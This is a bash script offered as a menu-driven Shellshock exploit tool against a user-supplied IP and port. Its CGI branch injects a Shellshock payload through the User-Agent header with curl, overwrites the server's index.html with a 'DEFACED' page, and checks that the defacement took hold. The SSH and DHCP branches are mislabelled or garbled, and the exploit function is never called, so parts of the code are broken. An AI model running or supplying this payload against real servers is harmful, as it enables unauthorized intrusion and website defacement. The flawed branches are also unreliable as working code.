#!/bin/bash

# Prompt the user to enter the target IP address
read -p "Enter the target IP address: " target_ip

# Prompt the user to enter the target port number
read -p "Enter the target port number: " target_port

# Prompt the user to select a payload
echo "Select a payload:"
echo "1. SSH-shellshock"
echo "2. CGI-shellshock"
echo "3. DHCP-shellshock"
read -p "Enter the payload number: " payload_number

# Map the user's selection to a payload string
case "$payload_number" in
    1)
        payload="SSH-shellshock"
        ;;
    2)
        payload="CGI-shellshock"
        ;;
    3)
        payload="DHCP-shellshock"
        ;;
    *)
        echo "Invalid selection"
        exit 1
        ;;
esac

# Define a function to send the exploit and test the defacement page
function send_exploit() {
    # Assign arguments to variables for later use
    target_ip=$1
    target_port=$2
    payload=$3

    # Select the appropriate payload based on the user input
case $payload in
    "SSH-shellshock")
        echo -e "\e[32m[+] Exploiting the target with SSH-shellshock payload...\e[0m"
        ssh -o "ProxyCommand /bin/bash -c 'exec 3<>/dev/tcp/$target_ip/$target_port; cat <&3 & cat >&3;kill \$!'" $target_ip
        echo -e "\e[32m[+] Exploit completed successfully\e[0m"
        ;;
    "CGI-shellshock")
        # Send the exploit to the remote web server via the CGI vulnerability using the "curl" command
        echo -e "\e[32m[+] Exploiting the target...\e[0m"
        curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>DEFACED</h1></body></html>\" > /var/www/index.html'" http://$target_ip:$target_port/cgi-bin/vulnerable && \
        # Check if the defacement page is deployed correctly on the remote web server using the "curl" command
        echo -e "\e[32m[+] Target exploited, testing defacement page deployment...\e[0m" && \
        curl http://$target_ip:$target_port
        # Display a message indicating that the exploit has completed successfully
        echo -e "\e[32m[+] Exploit completed successfully\e[0m"
        echo -e "	Now check your target: http://${target_ip}:${target_port}"
        ;;
    "DHCP-shellshock")
        # Send the exploit to the DHCP server via the DHCP client using the "dhclient" command
        echo -e "\e[32m[+] Exploiting the target with DHCP-shellshock payload...\e[0m"
        dhclient -6 -S -v -P -sf <(echo 'script -c /bin/bash /dev/null') -e "echo 'authoritative;'" eth0
        echo -e "\e[32m[+] Exploit completed successfully\e[0m"
        ;;
    *)
        # Display an error message if the user input does not match any of the available options
        echo -e "\e[31m[!] Invalid payload option selected. Please try again.\e[0m"
        return 1
        ;;
esac

}
